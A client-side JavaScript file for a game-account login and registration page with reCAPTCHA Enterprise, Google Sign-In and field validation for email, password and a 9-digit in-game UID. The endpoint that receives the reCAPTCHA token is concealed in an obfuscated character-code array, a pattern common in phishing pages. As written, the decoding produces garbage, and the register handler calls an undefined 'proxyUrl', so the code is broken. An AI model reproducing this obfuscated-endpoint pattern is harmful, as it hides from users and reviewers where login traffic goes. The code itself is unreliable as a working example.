const _pUp = [72, 72, 79, 72, 104, 104, 79, 72, 116, 84, 116, 72, 115, 97, 115, 72, 58, 79, 47, 84, 47, 104, 83, 104, 79, 72, 111, 115, 72, 104, 72, 105, 97, 110, 46, 109, 111, 101, 47, 99, 97, 112, 116, 99, 104, 97, 47, 103, 111, 79, 79, 103, 76, 101, 47, 114, 101, 99, 97, 112, 116, 99, 104, 97, 47, 118, 101, 114, 105, 102, 121];
const _px = _pUp
    .filter((c, i) => i % 2 === 0)
    .map(c => String.fromCharCode(c - 8))
    .join('');

function onClick(e) {
    e.preventDefault();
    grecaptcha.enterprise.ready(async () => {
    const token = await grecaptcha.enterprise.execute('6LcRawoqAAAAAF9tZG41oi6lOa8JE39h_oKYJtO-', {action: '_sho_LOGIN_RECAPTCHA'});
    console.log(`[ReCaptcha] Analyzing login request for potential bot activity...`);
    new Promise((resolve, reject) => {
        fetch(_px, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({
                token: token,
                action: '_sho_LOGIN_RECAPTCHA'
            })
        }).then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error('Failed to login');
        }).then(data => {
            console.log(data);
            if (data.status === 'success') {
                console.log(`[ReCaptcha] Login request is not a bot.`);
                resolve();
            }
        }).catch(error => {
            console.error(error);
            reject();
        });
    });
});
}

function RonClick(e) {
    e.preventDefault();
    grecaptcha.enterprise.ready(async () => {
    const token = await grecaptcha.enterprise.execute('6LcRawoqAAAAAF9tZG41oi6lOa8JE39h_oKYJtO-', {action: '_sho_REGISTER_RECAPTCHA'});
    console.log(`[ReCaptcha] Analyzing registration request for potential bot activity...`);
    new Promise((resolve, reject) => {
        fetch(proxyUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({
                token: token,
                action: '_sho_REGISTER_RECAPTCHA'
            })
        }).then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error('Failed to register');
        }).then(data => {
            console.log(data);
            if (data.status === 'success') {
                console.log(`[ReCaptcha] Register request is not a bot.`);
                resolve();
            }
        }).catch(error => {
            console.error(error);
            reject();
        });
    });
});
}

function handleCredentialResponse(response) {
    console.log("Encoded JWT ID token: " + response.credential);
    // Handle the response. You can send the token to your backend for verification and user login.
}

window.onload = function () {
    google.accounts.id.initialize({
        client_id: '1038483240536-89jm7b0oshigganmtrjod1404mu0u62q.apps.googleusercontent.com',
        callback: handleCredentialResponse
    });
    google.accounts.id.renderButton(
        document.getElementById('googleSignInButton'),
        {
            type: 'standard',
            theme: 'outline',
            size: 'large',
            text: 'signin_with',
            shape: 'pill',
            logo_alignment: 'left'
        }
    );
};

document.addEventListener('DOMContentLoaded', function() {
    if (document.getElementById('_sho-login') == null) {
        document.getElementById('_sho-register').addEventListener('click', RonClick);;
    } else {
        document.getElementById('_sho-login').addEventListener('click', onClick);
    }

    const fields = [
        {
            id: '_sho-email-field',
            regex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            checkIconId: '_sho-email-field-checkIcon',
            errorIconId: '_sho-email-field-errorIcon',
            errorMessageId: '_sho-email-field-error',
            errorMessage: 'Invalid email address.'
        },
        {
            id: '_sho-password-field',
            regex: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\W).{8,}$/,
            checkIconId: '_sho-password-field-checkIcon',
            errorIconId: '_sho-password-field-errorIcon',
            errorMessageId: '_sho-password-field-error',
            errorMessage: 'Password must be at least 8 characters long, and contain at least one uppercase letter, one lowercase letter, and one special character.'
        },
        {
            id: '_sho-uid-field',
            regex: /^\d{9}$/,
            checkIconId: '_sho-uid-field-checkIcon',
            errorIconId: '_sho-uid-field-errorIcon',
            errorMessageId: '_sho-uid-field-error',
            errorMessage: 'In-Game UID must be exactly 9 digits long.'
        }
    ];
    
    fields.forEach(field => {
        var inputField = document.getElementById(field.id);
        var checkIcon = document.getElementById(field.checkIconId);
        var errorIcon = document.getElementById(field.errorIconId);
        var errorMessage = document.getElementById(field.errorMessageId);
    
        if (inputField && checkIcon && errorIcon && errorMessage) {
            inputField.addEventListener('blur', function() {
                var value = inputField.value;
                
                if (field.regex.test(value)) {
                    checkIcon.classList.remove('hidden');
                    errorIcon.classList.add('hidden');
                    errorMessage.classList.add('hidden');
                    inputField.classList.add('border-green-400');
                    inputField.classList.remove('border-red-400');
                } else {
                    checkIcon.classList.add('hidden');
                    errorIcon.classList.remove('hidden');
                    errorMessage.classList.remove('hidden');
                    inputField.classList.add('border-red-400');
                    inputField.classList.remove('border-green-400');
                }
            });
        }
    });
});